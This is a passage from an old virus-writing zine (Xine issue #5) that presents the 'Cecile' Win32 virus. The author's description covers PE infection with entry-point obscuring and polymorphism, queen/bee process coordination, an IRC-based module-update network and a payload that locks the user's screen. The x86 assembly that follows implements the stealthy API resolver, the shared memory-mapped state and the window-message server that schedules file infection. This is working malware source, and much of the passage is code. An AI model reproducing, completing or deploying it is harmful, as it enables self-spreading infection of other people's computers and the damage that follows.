
   ;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                             ³ Xine - issue #5 - Phile 206 ³
   ;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ





   ;
   ;
   ;                    StarZero present the cecile virus
   ;
   ;
   ;
   ;  The code provided here is cautious, can be defectuous or have unstable
   ; behaviour, it has been tested on various conditions, and passed the tests,
   ; if something goes wrong, don't point at me and shout I'm a lamer as some
   ; poeple easily do so. I'm just programming for own pleasure, learning and
   ; studying new topics, so I do what I think interresting, but I'm not
   ; renumerated and I'm even not a professional. Im just an human, doing errors
   ; and learning from them, but Im also a very busy coder. If you meet any
   ; problems or bugs, better than critizing, please notify them to me. I will
   ; see what I can do. thanks
   ;
   ;  I started this virus in end of august 2000 with a mini idea, why not make
   ; a virus based on 3 (after 4) flexibe routine, by using pointers to routines.
   ; Well, at begining I planned 3 weeks to write this. Then finally, many
   ; technology came after and made the project growing dramatically.
   ;
   ; As usual, I rewrote everything from the beginning, and each time trying
   ; to improve already done work. This virus is very different of other in
   ; his philosophy/coding style. Let have a small tour of the virus
   ;
   ; + The first point in this virus is his special residency, a common virus
   ; start, modify the system, derivate some function or not, stay in the
   ; memory and then leave, this virus do other way. The virus run, allocate
   ; threads, and return to host. Threads use some interprocess to communicate
   ; with other cecile hinstances. (Well, without watching any other sources)
   ; To perform such action, it use a given client/server mechanism on win32
   ; machine to manage windows. To have a general memory between hinstances,
   ; the virus use a common shared temporary file wich vary from a machine
   ; to an other.
   ;
   ; + An other interprocess communication ability was provided by a memory
   ; mapped file that each hinstance try to open, this file is different on
   ; each machine, this memory mapped file is then filled with needed
   ; structure.
   ;
   ; + Queen/bee ability are then possible as viruses are able to communicate
   ; in an easy way, receiving and sending message. The virus first register
   ; themself to a server. If the server die, it's able to be remplaced by a
   ; bee. The queen never open a file if there exist at least one bee runned,
   ; the bee are there to infect file, the server find just executable among
   ; all the fixed disk connected on the machine. The queen/bee have a timer
   ; attached to their windowproc wich force them to update their ping each
   ; 50 ms, for detecting server crash, and remplace it.
   ;
   ; + The searching mechanism is not a standard recursive directory tree,
   ; using the common shared memory, it's able to resist a cold boot, a server
   ; crash of what ever else. It also use the timer to scan a directory only
   ; each seconds, making less suspect disk activity (I think it's enough that
   ; way), then each 2.5 seconds, it try to infect a file.
   ;
   ; + File are registered in the common memory, it have a maximum of 5000
   ; saved filenames, each file have a dword telling about his state, if the
   ; file was denied because already open, if the file was not a PE, if the
   ; file was not a MZ, if it was infected, infected with wich version ? If it
   ; need to be updated, etc etc etc...
   ;
   ; + For that, it cooperate via the common memory with the infection module
   ; by two way, providing the must updated image of the virus to drop to file,
   ; and also via sending a series of value passed to the infector. As I said
   ; it's not the queen that infect the file, it may be a much recent virus
   ; with other infection technique. It drop a virus image put in a bank. Bank
   ; are free common memory free for every infection process, there's 32
   ; (yes I know, it's a bit excessive).
   ;
   ; + The infection process is a bit complex, improving axelle bailey virus
   ; infection, this one totally kill the relocs, as they don't exist anymore
   ; in a cleaner way wich make less heuristic the virus presence. Today on
   ; normal application programs, after it process a complex, but compatible
   ; with other infection style infection, wich mean that the return to host
   ; stay the same and mean that if you change on disk the virus, the binary
   ; will still work. This ability of flushing himself to disk is funky eh :-)
   ;
   ; + The infection was previewved via a call patching, this can be builded or
   ; can be hooked via EPO, to perform epo, the virus don't watch for an api,
   ; but make a mini program tracing from the entrypoint, instruction by
   ; instruction, looking for the good call, and not one of the first calls.
   ; This mean for disinfection, you need to restore this call. This call is
   ; not derivated directly outside the section, but to a routine dropped on
   ; the code section witch will dispatch to the polymorphic entrypoint, and
   ; there's no hardcoded jump outside the code section, and the code section
   ; is not writable. :)
   ;
   ; + To perform tracing, the infection use a very small 8086 disassembler
   ; able to disassemble up to 486 instructions, it works quite well and passed
   ; many tests, it's not the first of this style I wrote, this one was very
   ; optimized and finally took just 2,5 kilobyte, enjoyable no ? So I tought I
   ; may apply it to Cecile, wich make the virus a bit much,mmm sexy :)
   ;
   ; + The infection dispatch to the poly module, the polymorphic engine was
   ; the primary reason of this virus, as aldebaran, I hope this virus will
   ; make honor to it, it's also very nice, and I hope, will make avers
   ; work quite much difficult. The input/output of this poly will be the
   ; reference for future poly for cecile, if I decide to swap it a day.
   ;
   ; + On 20 november, the virus show his payload, once again, it's a graphical
   ; payload, the virus swap resolution to 640x480x16 bpp and make a nice
   ; little opengl animation. The opengl animation assume a 3D world, with
   ; lights, camera, and rotation, don't think it's hard to do, it's about 800
   ; lines. It display three plane of squares passing from far to the bottom
   ; of the screen, where little squares describe the copyright text. It also
   ; try annoy the user and do not permit him to swap to other application.
   ;
   ; + The network module is not a worm, but a normal network module permitting
   ; to viruses principally to exchange datas, updated modules in fact between
   ; them, for that, they use a multi-layer system. Multilayer was done in
   ; compatibility between routines. In fact, there's 5 layers, one who manage
   ; the internet connection, the level 1, one who manage irc operations, layer
   ; 2, one who manage channel operation level 3, one who manage the
   ; virus-2-virus protocol level 4, and the data exchanging protocol, level 5.
   ;
   ; + Finally, irc is usefull as a meet point, cecile connect with 3 variable
   ; letters, and then 4 digits that is their code. The letters vary in function
   ; of the digit, then everybody can't be a cecile hinstance, they join a
   ; channel, wich vary each week, then display that they are aivable by
   ; sending a message. Messages are locked with a CRC, the crc depend of
   ; sender. Then it search for an other aivable cecile connected, and start
   ; connection. They both give their module versions. If any module version is
   ; updated, then they request the data sending. Data sending is a series of
   ; 50 byte packets of module x, wich contain a packet CRC check, an
   ; encryption, a total crc check, and a few much verification. Then it may
   ; update the virus.
   ;
   ; + Ah, yes I forgot to talk about the updating mechanism, the updating
   ; mechanism work in two ways, the virus may flush module to bank 33, at init
   ; but for that, you need that the virus is running on the machine. So, I
   ; put an other way of updating, by dropping the module at bank 34, if the
   ; modules at bank 34 are better than the one in bank 33, then the virus
   ; rebuild just modules from bank 34. To avoid updating while copying image
   ; to virus bank, it use an userlevel method. If nobody is using bank 33,
   ; then bank 34 is flushed to bank 33. Also, modules are limited to be
   ; 8 ko long, but I think it's sufficient, well anyway, all that is constants
   ; and can be modified quite easily.
   ;
   ; + Also, the virus use two things a bit different, first of all, it doesn't
   ; use delta pointers as register, but a macro call loadpointer. Some poeple
   ; may think it's useless, no, it's okay for many reason, 1st coz the kernel
   ; don't use too much the ebp but prefer to play with stack. Also, the
   ; infection module use ebp for other reasons, and it's not something bad.
   ;
   ; + The virus also use a macro to call api. There's two calling method. If
   ; the api is normal, then the api memory entrypoint is calculated real-time
   ; and not saved to a virus table. In some apps, the api calling have to
   ; be very fast, as in the payload, the virus then manage his own memory
   ; table in a temporary buffer, a bit of stack as exemple. The Fast apicall
   ; and apicall are two routines that call apis just via the crc,
   ;
   ; + The virus have internal library handle, to keep the win32 spirit of
   ; importing library, the virus have 16 own imported library handle. So
   ; module can import their own library, like winsock (12) or user32 (1)
   ; kernel(0).
   ;
   ; + Also, the virus is able to perform a flexible linking from module to
   ; kernel/other module function to power up their possibility. Instead of
   ; sharing many function, this virus share just a few one, given by number
   ; code, This mean that two different kernel with different shared function
   ; will be not compatible, but that's one of cecile limitation
   ;
   ; okay, hope it pleased you, today I'm a bit bored of this virus, I want
   ; to pass to something else, keep tuned, and finally, this virus is
   ; an offrand to a person "far" from me, in all sense of the word, c'est la
   ; vie...
   ;

   .586P
   .model flat, stdcall

   extrn   ExitProcess:Proc
   extrn   CreateWindowExA:Proc

   .data
           db 0
   .code

   start:      mov eax,00400000h
           jmp startnow

           call    CreateWindowExA

   VirusStart:
   starthere:

   ;
   ;   a bee is runned, we participate to the comunauty
   ;

   loadpointer     macro   destination,origin,tst

               call    &tst&_map
   &tst&_map:      add dword ptr [esp],&origin&-&tst&_map
               xchg    eax,dword ptr [esp]
               mov dword ptr &destination&,eax
               pop eax

               endm

   Fapicall        macro   apicode, handle, kkva

               mov     edx,handle
               loadpointer ecx,fastcall,&kkva&
               mov     eax,apicode
               call        ExtendedApiCall

               endm

   apicall         macro   apicode, handle

               mov edx,handle
               mov eax,apicode
               call    ApiCallit

               endm

               structfil   equ 260+4+4+4
               nullsize    equ 1024+512
               bankcommsize    equ 32
               banksize    equ 0FFFFh
               modulesize  equ 8192

   filsize equ 8096+(structfil*5000)+(banksize*34)+(bankcommsize*32)+4

   ;
   ; mapped file structure
   ;
   ;   0 - 16              queen self data managing
   ;   16 - 4096           bees register zone
   ;   4096 - 8096             file finder reserved data
   ;   8086 - structfil * 5000     saved found file data
   ;   bankcommsize * 32
   ;   banksize 0-32 + 33 and 34 wich are managing
   ;
   ;   extended header was added in finder area + 1024+768
   ;


       call    Init0


   startnow:

       call    Api_init

       loadpointer edx,user32,i2           ; load user32.dll
       mov     ecx,0               ; getmodul it
       mov     eax,1               ; into dll bank 1
       call        loadhandle

       cmp     eax,0
       je      skiploadit

       sub esp,12
       mov edx,esp
       mov dword ptr [edx],12
       mov dword ptr [edx+4],0
       mov dword ptr [edx+8],0

       loadpointer ebx,InitThread, i1

       push        eax
       push        esp
       push        0
       push        0
       push        ebx
       push        0
       push        edx
           apicall     0CA2C0A90h,0            ; Create Thread

       pop eax

       mov eax,2
       call    ModuleCall

       add esp,12
       skiploadit:

       jmp Fini0

   InitThread:

   ;   int 3
   ;
   ;   push    4               ; PAGE_READWRITE
   ;   push    1000h
   ;   push    4096
   ;   push    0
   ;   call    VirtualAlloc
   ;
   ;   mov esp,eax
   ;   add esp,4096

       mov     ecx,8*32
       sub     esp,ecx
       loadpointer edx,fastcall,fs1
       mov     edi,esp
       mov     dword ptr [edx],edi
       xor     eax,eax
       repz        stosb

       sub esp,256*3
       mov eax,esp

       push    eax
           push    'ce0'

       push    esp
       push    1
           push    000F001Fh
       apicall 837E5818h,0             ; OpenFileMappingA

       pop edx
       pop edx

       mov edi,1

       cmp eax,0
       jne startfromhere




       mov eax,edx
       push    eax

       lea edx, [eax+4]
       mov dword ptr [eax],128

       push    eax
       push    edx
       apicall 2AEB9EB2h,0             ; GetComputerName

       pop eax

       add     eax,4
       push    eax
       mov edx,dword ptr [eax]

       mov ecx,4
   getmaic:
       cmp dl,'0'-1
       ja  noproblem
       mov dl,'Z'

   noproblem:

       rol edx,8
       loop    getmaic

       and edx,00FFFFFFh
       mov dword ptr [eax-4-4], edx
       xor edx,edx

   gotintothat:

       movzx   ecx,byte ptr [eax]
       add edx,ecx
       rol edx,5
       inc eax
       cmp byte ptr [eax],0
       jne gotintothat

       sub esp,4

       pop eax
       push    edx

       push    eax
       push    256
       apicall 148f1962h,0             ; gettempath

       pop eax

       mov edx,esp
       push    eax

       lea ecx,[edx+4]

       push    ecx

       push    ecx
       push    eax
       push    edx
       push    ecx

       apicall 0A897A690h,0                ; gettempfilename

       pop ecx

       mov edx, 3                  ; open_always

   loaditagain:

       sub esp,12
       mov eax,esp
       mov dword ptr [eax],12
       mov dword ptr [eax+4],0
       mov dword ptr [eax+8],0

       push    ecx
       push    edx

       push    0
       push    80h
       push    edx
       push    eax
       push    03              ; file sharing
       push    0C0000000h
       push    ecx
       apicall 0193E83EEh,0            ; CreateFileA

       cmp eax,-1
       jne makethatthat

       pop edx
       pop ecx

       add esp,12

       cmp edx,2
       je  skiploading

       mov edx,2
       jmp loaditagain

   makethatthat:

           add     esp,8

           mov     ecx,esp

           push    'ce0'
           mov     edx,esp

           push    edx
           push    filsize
           push    0
           push    04h
           push    ecx
           push    eax
           apicall    097E2AF98h,0         ; CreateFileMapping

       add esp,12

       mov edi,0

   startfromhere:

           push    0
           push    0
           push    0
           push    000F001Fh
           push    eax
           apicall    03D547DB1h,0             ; MapViewOfFile

       cmp edi,1
       je  sfmskipit

       push    eax
       mov edi,eax
       add edi,8
       xor eax,eax
       mov ecx,nullsize
       repz    stosb
       pop eax
       mov dword ptr [eax],'!CeC'

   sfmskipit:

       mov dword ptr [eax+8096+(structfil*5000)],0
       mov     dword ptr [eax+filsize-bankcommsize],0

           call    SetMappedFile

           push    0
           apicall 1017d1A1h,0             ;GetModuleHAndle

           mov     ecx,'0EC'
           push    ecx
           mov     edx,esp

           push    edx
           push    eax

           sub     esp,40
           mov     ebx,esp
           mov     dword ptr [ebx],0
       loadpointer [ebx+4],winproc,t1      ; window proc
           mov     dword ptr [ebx+8],0
           mov     dword ptr [ebx+12],0
           mov     dword ptr [ebx+16],eax          ; Module handle
           mov     dword ptr [ebx+20],0
           mov     dword ptr [ebx+24],0
           mov     dword ptr [ebx+28],0
           mov     dword ptr [ebx+32],0
           mov     dword ptr [ebx+36],edx          ; name

           push    ebx
           apicall 0D48A96AAh,1            ; RegisterClassA
           add     esp,40

           pop     eax
           pop     edx

           push    'VD0'
           mov     ecx,esp

           push    0
           push    eax
           push    0
           push    0
           push    0
           push    0
           push    0
           push    0
           push    0
           push    ecx
           push    edx
           push    0

           apicall 7099fb9ch,1         ; CreateWindowEx

       loadpointer ebx,windowproc01,g354
       mov dword ptr [ebx],eax

       pop ecx
       pop ecx

       push    eax
       push    eax

       push    eax
       call    GetMappedFile
       mov eax,dword ptr [eax+4]
       pop edx

       loadpointer     ecx,VersionDirty,popo2
       mov     ecx,[ecx]

       push    ecx
       push    edx
       push    WM_REGCLIENT
       push    eax
       apicall 0FBAC7F60h,1            ; SendMessageA

       pop edx

       push    eax

       push    edx
       push    0
       push    50
       push    edx
       push    edx
       apicall 061a186d0h,1            ; SetTimer
       pop edx

       pop eax

       cmp eax,0
       jne gohere1

       call    GetMappedFile
       mov dword ptr [eax+4],edx

   gohere1:

       pushad
       call    CheckUpdated            ; Check update consistency
       popad

       mov eax,edx

       pushad
       mov eax,3
       call    ModuleCall
       popad

   gohere:

           push    eax
           sub     esp,44
           mov     edx,esp

           push    edx

       push    0
       push    0
       push    eax
       push    edx
       apicall 03BAC79F3h,1            ; GetMessageA

   gomimi:
       cmp eax,0
       pop edx
       je  gomimi1

           push    edx
           push    edx
           apicall 050d9920Ch,1            ; TranslateMessageA
       apicall 05BFFA45Ch,1            ; dispatchMessageA

   skiski:
           add     esp,44
           pop     eax
           jmp     gohere

   gomimi1:

       push    0
       apicall 790c0575h,0         ; ExitThread

   SetMappedFile:
       call    getitmap
       ret

   getitmap:
       xchg    dword ptr [esp],ecx
       pushad
       lea     edx,[ecx+mapped-getitmap+1]
       mov dword ptr [edx],eax
       popad
       xchg    ecx,dword ptr [esp]
       ret

   GetMappedFile:

       call    getitmap1
       ret
   getitmap1:
       mov eax,dword ptr [esp]
       lea     eax,[eax+mapped-getitmap1+1]
       mov eax,dword ptr [eax]

       ret

   user32: db  'USER32.DLL',0

   fastcall:   dd  0
   mapped:     dd  0
   windowproc01:   dd  0

   ;
   ; The Api call system (2/10/2K) - (last rev 6/12/2K)
   ;
   ;
   ; The principe of this api system call is that when the program call the api,
   ; this system will re-calculate the api call, loosing time you will say, but
   ; we have two advantages, no need of long name/crc table, and no need of long
   ; buffer to receive adresses, and if the search is fast enough, then I think
   ; that's okay to be done
   ;
   ; Api calling system was build in order to let modules call any api of any dlls
   ; not depending from these that the kernel import, now it assume:
   ;
   ;   - find the kernel by finding in the import table for exported address
   ;        of KERNEL32 if not found, get the last dll and then
   ;           - scan in the lib about loaded KERNEL, if not
   ;                 ( - hook exception and test hardcore address,
   ;                    the virus don't get runned in such case
   ;

   Api_init:

   loadpointer     ecx,savebase, api1
   mov     dword ptr [ecx],eax         ; set the PE image base init
   mov     esi,eax

   mov     edx,[esi+03Ch]              ; load the Pe header of PE
   lea     edi,[esi+edx]               ; edi point to it in mem

   mov     edx,dword ptr [edi+128]         ; load import table
   add     edx,esi

   loopagain75:

   mov ebx,dword ptr [edx+12]          ; name rva
   add ebx,esi

   cmp dword ptr [ebx],'NREK'          ; 'NERK'
   jne stoombabase

   call    checkkern               ; check if it's kernel32.dll

   stoombabase:

   add edx,20

   cmp dword ptr [edx],0           ; check all libs
   jne loopagain75

   mov eax,dword ptr [edx-4]           ; load the last imported
   add eax,esi                 ; lib
   mov eax,dword ptr [eax]         ; get an import
   call    getcheckup              ; loop to the MZ

   mov esi,eax
   add eax,dword ptr [eax+03Ch]        ; get the PE
   mov edx,dword ptr [eax+128]         ; the the import
   add edx,esi

   loopagain76:

   mov ebx,dword ptr [edx+12]          ; name rva
   add ebx,esi

   cmp dword ptr [ebx],'NREK'          ; 'NERK'
   jne goaway669

   call    checkkern               ; recheck kernel32

   goaway669:

   add edx,20                  ; get next entry in table

   cmp dword ptr [edx],0
   jne loopagain76             ; go to there

   goaway6670:                 ; houston we got a problem!

   push    dword ptr FS:[0]            ; save old SEH

   loadpointer ebx, pseudoseh, api85       ; SEH point to teh SEH

   push    ebx
   push    0

   mov dword ptr FS:[0],esp

   mov eax, 07FFE0000h             ; check win2K kernel

   instr1:
   cmp word ptr cs:[eax],'ZM'          ; exception fault ?
   instr2:
   je  regkernel               ; go there

   mov eax, 07FFF0000h             ; then check NT4 kernel

   cmp word ptr cs:[eax],'ZM'          ; exception fault ?
   je  regkernel

   mov eax, 0BFF70000h             ; get win9x kernel

   cmp word ptr cs:[eax],'ZM'
   je  regkernel

   mov eax, 0BFF60000h             ; get WinMe kernel

   cmp word ptr cs:[eax],'ZM'
   je  regkernel

   ; houston, we have a problem :[
   ; in this extreme case, we couldn't at all reach kernel, we are going to crash

   regkernel:

   loadpointer ebx,kernelbase, wfk     ; then save it !
   mov     dword ptr [ebx],eax     ;

   pop eax
   pop eax                 ; fix stack

   pop dword ptr FS:[0]            ; restore SEH

   ret

   pseudoseh:

   mov eax,dword ptr [esp+2ch]         ; load the thread state
   add dword ptr [eax+0b8h],instr2-instr1  ; go to next instruction

   xor eax,eax
   ret

   checkkern:

   cmp dword ptr [ebx+4],'23LE'        ; KERN - EL32
   jne stoombabase5

   pop ecx
   jmp stambase10

   stoombabase5:                   ; go there and everything
                           ; is okay!
   ret

   stambase10:

   mov eax,dword ptr [edx+16]          ; load an API
   add eax,esi
   mov eax,dword ptr [eax]         ; address

   call    getcheckup              ; go to MZ

   jmp continueproc

   getcheckup:

   and eax,0FFFF0000h              ; get advantage of the fact
                           ; that PE are loaded every
   loaduntillkernel:               ; 10000h , wich
                           ; permit 65535 process
   cmp word ptr [eax],'ZM'         ; runned on a machine
   je  wefoundkernel               ; loop untill MZ

   sub eax,010000h
   jmp loaduntillkernel            ; check every 10000h

   wefoundkernel:
   ret

   continueproc:

   loadpointer ebx,kernelbase, wfk186
   mov     dword ptr [ebx],eax     ; save the kernel base

   ret

   ApiCallit:

   xor     ebx,ebx

   Intrn_ApiCallit:

   pushad

   loadpointer     esi,kernelbase,ap1          ; load the lib handle
   mov     esi,dword ptr [esi+edx*4]       ; esi = lib loaded

   mov     edi,dword ptr [esi+03Ch]        ; go to export table
   add     edi,esi

   mov     edi,dword ptr [edi+120]         ; go to export table
   add     edi,esi
   mov     ecx,dword ptr [edi+24]

   mov     edx,dword ptr [edi+32]          ; name RVA
   add     edx,esi

   getapinow:
   call        CheckApi                ; check if it's good
                               ; name
   loop        getapinow               ; untill all checked

   popad
   xor     eax,eax                 ; error code return
   dec     eax
   ret

   CheckApi:

   push    ecx                     ; save id/loc
   push    edx

   mov edx,dword ptr [edx]             ; get name rva
   add edx,esi

   xor ebx,ebx                     ; ebx will receive
                               ; crc
   getitagain:

   push    edx
   movzx   edx,byte ptr [edx]              ; load the ascii value
   add ebx,edx                     ; add it to the crc
   pop edx

   inc edx                     ; next char
   rol ebx,3                       ; rol ebx,3

   cmp byte ptr [edx],0                ; untill all the
   jne getitagain                  ; api name was calcula.

   cmp ebx,eax                     ; requested api ?
   jne gotittatam                  ; no check next

   pop edx
   pop ecx                     ; restore id/loc
   pop ecx                     ; stack value

   sub edx,dword ptr [edi+32]              ; substract api ref
   sub edx,esi                     ; base and mz base

   shr edx,1                       ; divide by 4

   mov ebx,dword ptr [edi+36]              ; load api index
   add ebx,esi                     ; plus base
   movzx   ecx,word ptr [edx+ebx]              ; load api core ref

   shl ecx,2                       ; multiply it by 4
   mov edx,dword ptr [edi+28]              ; load api adress base
   add edx,esi

   mov ebx,eax                     ; save crc
   mov eax,dword ptr [edx+ecx]             ;
   add eax,esi

   mov dword ptr [esp+20h-4],eax           ; put eax = 3

   cmp dword ptr [esp+20h-4-4-4-4],15      ; check ebx = 15 ?
   jne dontregisterit              ; special code for registering

   mov ecx,dword ptr [esp+20h-4-4]         ; load old ecx
   mov ecx,dword ptr [ecx]             ; load pointer in it

   sub ecx,8

   getagainme5:
   add ecx,8                       ; check for a free
   cmp dword ptr [ecx],0               ; place in it
   jne getagainme5

   mov dword ptr [ecx],ebx             ; save crc
   mov dword ptr [ecx+4],eax               ; save adress

   dontregisterit:

   popad                           ; restore everything

   dontcallapi:
   cmp byte ptr [eax],0CCh             ; int 3 there ?
   je  dontcallapi                 ; really then go away

   jmp eax

   gotittatam:                     ; not requested api

   pop edx
   pop ecx

   add edx,4                       ; return and check
   ret                         ; next api

   ExtendedApiCall:

   pushad

   mov ecx,dword ptr [ecx]             ; load api crc buffer
   sub ecx,8

   getnext277:
   add ecx,8

   cmp dword ptr [ecx],eax             ; have we arleady
   je  directcallit                    ; searched that api

   cmp dword ptr [ecx],0               ; check if ecx = 0
   jne getnext277

   popad

   mov ebx,15                      ; set save to buffer
   jmp Intrn_ApiCallit                 ; to Api finder

   directcallit:

   mov eax,dword ptr [ecx+4]
   mov dword ptr [esp+20h-4],eax           ; restore API adress

   jmp dontregisterit                  ; call it

   loadhandle:

   push        eax             ; save handle to be fixed with

   cmp     ecx,0               ; watch if you need a loadlib
   je      gotbyebye           ; or a get module

   push        edx
   apicall     0BAE81A01h,0            ; LoadLibraryA from kernel
   jmp     getthere

   gotbyebye:

   push        edx
   apicall     01017D1A1h, 0           ; GetModuleHandle in (0) (krnl)

   getthere:

   pop     ecx
   loadpointer edx,kernelbase, ll1

   mov     dword ptr [edx+ecx*4],eax   ; save adress to khandles

   ret

   savebase:   dd      00400000h
   kernelbase: dd      00000000h       ; 15 library handle free

   khandles:   dd  15 dup (0)

   ;
   ; What does the Server/client assume ?
   ;
   ;   Well, the server client use a prebuilded windows server/client mode in
   ; order to work, thus permetting with api to access an easy interprocess
   ; communication and messaging between virus hinstances. By creating his own
   ; window proc, the window proc wait for message that are sent each time the
   ; virus is run. This client server mode can be seen as a queen/bee colony, as
   ; it have many aspects of it, having a queen, having workers, assigning task
   ; and develloping, expanding the colony.
   ;
   ; the virus handle a few message :      1st stable workin 1/10/2K
   ;
   ;       - A timer will tell to the server to find a much PE
   ;           and/or updating the timer of the routine (client/serv)
   ;       - A routine that is used only by the server, it register client
   ;           to the common memory when they are runned
   ;       - An infection message that specify a location in the common
   ;           memory where the file name is stocked, then prepare
   ;           for a module calling, then pass control to module
   ;       - If the process is closed, the server is able to select an
   ;           other and swap himself
   ;       - A client server ping pong system used when a time out
   ;           has been detected, used to see if client disconnected
   ;           coz process crashed or such
   ;       - An updating message wich can be called to the server by any
   ;           External virus hinstance, this making cecile an
   ;           "updatable" virus alike. See modulisation topic
   ;
   ; Alternatively, the server assume also the passing trough module, if infection
   ; is send to remote process, polymorphic encryption is directly send to the
   ; current process and not given as message, coz the message could fail, if
   ; as exemple, the message is sent in the dead time of a closed or crashed
   ; process and could let, the virus unencrypted, wich could be very dangerous
   ; for us.
   ;

   WM_REGCLIENT    equ 50701
   WM_INFECTEXE    equ 50702
   WM_VIRPING  equ 50703
   WM_UPDATE   equ 50704

   winproc:

   hwndval         equ     4
   hmsgval         equ     8
   wpamval         equ     12
   lpamval         equ     16

       xor eax,eax

       mov ebx,dword ptr [esp+hmsgval]

           cmp     ebx,01                  ; WM_CREATE
           je      returnnull
           cmp     ebx,05                  ; WM_RESIZE
           je      returnnull
       cmp ebx,WM_REGCLIENT            ; our register message
       je  regclient
       cmp ebx,WM_INFECTEXE            ; our client message
       je  Infectexe
       cmp ebx,WM_VIRPING              ; dead test
       je  ReturnPing
       cmp ebx,WM_UPDATE               ; update code and add
       je  updatecode9             ; new version
       cmp ebx,113h                ; WM_TIMER
       je  timerset
       cmp ebx,16                  ; WM_CLOSE
       je  switchserver

   translatemessage:

       pushad

           push     dword ptr [esp+20h+lpamval]
           push     dword ptr [esp+20h+4+wpamval]
           push     dword ptr [esp+20h+4+4+hmsgval]
           push     dword ptr [esp+20h+4+4+4+hwndval]

           apicall  023ED6274h,1               ; DefWindowProcA

       mov  dword ptr [esp+20h-4],eax
       popad

       returnnull:

           ret      16

   registernet0:

       pushad

       call    GetMappedFile           ;

       push    eax
       mov eax,dword ptr [eax+1024+768]    ; load the net handle of it

       push    eax             ; if zero then it's bad

       cmp eax,0
       je  skip_loadit

       push    0
       push    0
       push    WM_VIRPING
       push    eax
       apicall 0FBAC7F60h,1            ; SendMessageA
                           ; the trust pass ,
                           ; Alife or Not ?
       pop edx
       pop ebx             ; restore

       cmp eax,edx
       je  returnerror         ; is it still alife ?

   skip_loadat0:

       loadpointer edx,windowproc01,v119   ; no then register this
       mov eax,dword ptr [edx]     ; cecile handle to the
       mov dword ptr [ebx+1024+768],eax    ; value

       popad
       mov eax,1
       ret

   skip_loadit:

       pop edx             ; return it normally
       pop ebx
       jmp skip_loadat0

       returnerror:

       popad                   ; return with error,
       xor eax,eax             ; network registered
       ret

   updatecode9:

       pushad

       mov ecx,dword ptr [esp+20h+wpamval]
       call    UpdateThisModule            ; update from remote
                               ; process
       popad

       xor eax,eax
       ret 16

   ReturnPing:

       mov eax,dword ptr [esp+hwndval]     ; return window value
       ret 16

   regclient:

           mov     edx,dword ptr [esp+wpamval]     ;
       mov ecx,dword ptr [esp+lpamval]

       push    edx

       call    CheckUpdated                ; see if + recent

       call    GetMappedFile
       lea edx,[eax+16]

       pop eax

       mov ecx,256

   goaway: cmp dword ptr [edx],eax         ; watch for a zero
       je  setzero                 ; in the first
                               ; zone
       add edx,12

       cmp dword ptr [edx], 0          ; forget it
       je  regit

       loop    goaway                  ; loop to it

       ret 16

   regit:
       push    eax
       mov dword ptr [edx],eax         ; save window handle
       push    edx
       apicall 17357e7Ah,0             ; GetTickCount
       pop edx
       mov dword ptr [edx+4],eax           ; set last counted
       pop eax

   setzero:

       mov dword ptr [edx+8],0         ; nullify last counted
           ret     16

   ;timerproc:
   ;
   ;   ret 16

   timerset:

       call    GetMappedFile               ; each 50 millisec
       call    CleanTimeOut                ; watch if some cecile
       lea edx,[eax+16]                ; is not dead

       mov eax,dword ptr [esp+hwndval]

       cmp dword ptr [edx-12],eax          ; check if we are serv
       je  weareserver

       mov ecx,64                  ; check between
       sub edx,12                  ; 64 1st users

   getnextimer:

       add edx,12                  ;
       cmp dword ptr [edx],eax         ; any of it equal our ?
       je  updatetimer

       loop    getnextimer             ; go to next timer

       xor eax,eax
       ret     16

       updatetimer:

       push    edx
       apicall 17357e7Ah,0             ; GetTickCount
       pop edx

       mov dword ptr [edx+4],eax           ; update our life test

       ret 16

   weareserver:

       push    edx
       apicall 17357e7Ah,0             ; GetTickCount
       pop edx

       mov dword ptr [edx-8],eax           ; update server

       inc dword ptr [edx-4]           ; increment counter

       cmp dword ptr [edx-4],50            ; every  sec
       ja  InfectAFile

       pushad

       mov ecx,10

   benbenit:

       add ecx,10

       cmp dword ptr [edx-4],ecx           ;
       jne skipfindFax             ; every 50 sec

       cmp ecx,40
       jne benbenit                ; check 4 times

       jmp skipfindit

   skipfindFax:

       call    FindAFile               ; find files

   skipfindit:

       apicall 17357e7Ah,0             ; GetTickCount

       mov dword ptr [esp+20h-4],eax       ; update ping
       popad

       mov dword ptr [edx-8],eax           ; update ping

   skipit:
       ret 16

   switchserver:                       ; server died

       call    GetMappedFile               ; load mapped file
       push    eax
       call    CleanTimeOut                ; clean the timeouts
       pop edx
       mov ebx,dword ptr [esp+hwndval]

       cmp dword ptr [edx+4],ebx           ; the window is the
       jne skipthisvoo             ; server ?

       mov dword ptr [edx+4],0         ; yes, then nuliffy
       mov dword ptr [edx+8],0         ; everyhting

       add eax,4
       mov ecx,64                  ; fix the server

   getnext77:                      ; is the current bee

       add eax,12

       cmp dword ptr [eax],0           ; load a cecile running
       jne goaway66

       loop    getnext77

   skipthisvoo:

       xor eax,eax
       jmp PostQuitit              ; and leave!

   goaway66:

       mov ebx,dword ptr [eax]         ; we found one ?
       mov ecx,dword ptr [eax+4]

       mov dword ptr [edx+4],ebx
       mov dword ptr [edx+8],ecx           ; set the queen

       mov dword ptr [eax],0           ; nullify the current
       mov dword ptr [eax+4],0         ; cecile bee
       mov dword ptr [eax+8],0

   PostQuitit:

       push    0
       apicall 07818C6Bh,1         ; PostQuitMessage

       ret 16
   ;   jmp     translatemessage

   CleanTimeOut:

   ; receive in eax the

       pushad
       push    eax
       apicall 17357e7Ah,0             ; GetTickCount
       pop edx

       mov ecx,64
       add edx,4

   getnext97:

       add edx,12

       cmp dword ptr [edx],0           ; if null ?
       je  getnext99

       cmp eax,dword ptr [edx+4]           ; if smaller then
       jb  getnext99               ; the ping

       push    ecx
       mov ecx,dword ptr [edx+4]

       sub ecx,eax
       neg ecx             ; see last ping ?

       cmp ecx,800             ; server should be alife that
       pop ecx             ; moment
       jb  getnext99

       push    eax
       pushad

       push    0
       push    0
       push    WM_VIRPING          ; ping it
       push    dword ptr [edx]
       apicall 0FBAC7F60h,1            ; SendMessageA
                           ; the trust pass ,
                           ; Alife or Not ?
       mov dword ptr [esp+20h-4],eax
       popad

       cmp dword ptr [edx],eax     ; if alife
       pop eax
       jne cleanit

       mov dword ptr [edx+4],eax       ; set ping
       jmp getnext99

       cleanit:

       mov dword ptr [edx],0
       mov dword ptr [edx+4],0
       mov dword ptr [edx+8],0     ; nullify client !

   getnext99:
       loop    getnext97           ; do it for all

   goaway785:
       popad
       ret

